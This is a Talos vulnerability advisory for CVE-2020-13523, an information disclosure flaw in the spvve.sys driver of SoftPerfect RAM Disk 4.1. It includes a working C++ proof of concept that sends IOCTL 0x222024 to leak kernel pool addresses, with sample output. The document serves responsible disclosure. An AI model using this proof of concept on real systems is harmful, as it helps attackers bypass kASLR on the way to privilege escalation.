# Talos Vulnerability Report

### TALOS-2020-1122

## SoftPerfect RAM Disk spvve.sys 0x222024 information disclosure vulnerability

##### August 4, 2020

##### CVE Number

CVE-2020-13523

##### SUMMARY

An exploitable information disclosure vulnerability exists in SoftPerfect’s RAM Disk 4.1 spvve.sys driver. A specially crafted I/O request packet (IRP) can cause the disclosure of sensitive information. An attacker can send a malicious IRP to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

SoftPerfect RAM Disk 4.1

##### PRODUCT URLS

RAM Disk - <https://www.softperfect.com/products/ramdisk/>

##### CVSSv3 SCORE

3.8 - CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N

##### CWE

CWE-200 - Information Exposure

##### DETAILS

SoftPerfect RAM Disk is a high-performance RAM disk application that lets the user store a disk from their computer stored on the device’s memory.

The spvve.sys driver creates a device object `Device\SoftPerfectVolume` that is accessible to any user on the system so any user sending specially crafted I/O request packet (IRP) can cause information disclosure (leak kernel pool memory address).

```
int main()
{
	const wchar_t* errmsg = NULL;
	LPCWSTR deviceName = L"\\Device\\SoftPerfectVolume";
	HANDLE hDevice = OpenDeviceWorker(deviceName, GENERIC_READ | GENERIC_WRITE, &errmsg, TRUE);
	if (hDevice == INVALID_HANDLE_VALUE) {
		if (errmsg == NULL) {
			printf("error: something in OpenDeviceEx failed\n");
		}
		else {
			wprintf(L"error: %s\n", errmsg);
		}
	}

	const DWORD inBufferSize = 8;
	const DWORD outBufferSize = 16;
	PBYTE inBuffer = new BYTE[inBufferSize];
	PBYTE outBuffer = new BYTE[outBufferSize];;
	DWORD returned;

	//kernel pool memory address leak
	printf("DeviceIoControl IOCTL : 0x222024\n");
	DeviceIoControl(hDevice,
		0x222024,
		inBuffer,
		inBufferSize,
		outBuffer,
		outBufferSize,
		&returned,
		0);

	neolib::hex_dump(outBuffer, outBufferSize, std::cout);

	return 0;
}

```

output:

```
C:\tmp\ramdisk>RamDiskMemLeak.exe
DeviceIoControl IOCTL : 0x222024
0000 : ....h....2...2.. D0 96 EA 00 68 92 EA 00 00 32 EA 00 00 32 EA 00

C:\tmp\ramdisk>RamDiskMemLeak.exe
DeviceIoControl IOCTL : 0x222024
0000 : h8O...O......0.. 68 38 4F 01 C0 00 4F 01 07 00 00 07 B0 30 00 00

C:\tmp\ramdisk>RamDiskMemLeak.exe
DeviceIoControl IOCTL : 0x222024
0000 : .!.............. A8 21 FD 00 C0 00 FD 00 00 00 00 00 00 00 00 00

```

This kind of vulnerability can allow an attacker to bypass kASLR mitigation and open possibility to local privilage escalation when used in conjunction with another vulnerability.
